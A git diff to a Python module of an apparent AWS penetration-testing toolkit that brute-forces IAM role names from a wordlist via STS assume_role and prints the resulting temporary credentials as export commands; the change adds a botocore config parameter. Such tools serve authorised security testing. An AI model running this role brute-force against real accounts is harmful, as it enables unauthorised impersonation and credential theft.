@@ -16,8 +16,8 @@ def help():
     print("\tto use the new role identity and halt execution.")
     print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
 
-def assume_role(session, role_name, acc_number, session_name):
-    client = session.client('sts')
+def assume_role(session, role_name, acc_number, session_name, botoconfig):
+    client = session.client('sts', config=botoconfig)
     try:
         response = client.assume_role(
                 RoleArn='arn:aws:iam::{}:role/{}'.format(acc_number, role_name),
@@ -28,7 +28,7 @@ def assume_role(session, role_name, acc_number, session_name):
     except Exception as e:
         return(e.response["Error"]["Code"])
 
-def brute_role(session):
+def brute_role(session, botoconfig):
     wordlist = input("Please specify the wordlist to be used: ")
 
     if not os.path.exists(wordlist):
@@ -47,9 +47,8 @@ def brute_role(session):
 
     for role_name in role_names:
         arn = "[+] Trying to impersonate role = arn:aws:iam::{}:role/{}".format(acc_number, role_name.strip())
-        print(arn)
 
-        AssumeRole = assume_role(session, role_name.strip(), acc_number, session_name)
+        AssumeRole = assume_role(session, role_name.strip(), acc_number, session_name, botoconfig)
         
         if AssumeRole == "AccessDenied":
             pass
@@ -62,8 +61,8 @@ def brute_role(session):
             print("export AWS_SESSION_TOKEN={}".format(AssumeRole["Credentials"]["SessionToken"]))
             break
 
-def main(selected_session, session):
+def main(botoconfig, session, selected_session):
     print(Fore.YELLOW + "================================================================================================" + Style.RESET_ALL)
     print("[+] Starting Bruteforce Roles Module...\n")
 
-    brute_role(session)
+    brute_role(session, botoconfig)
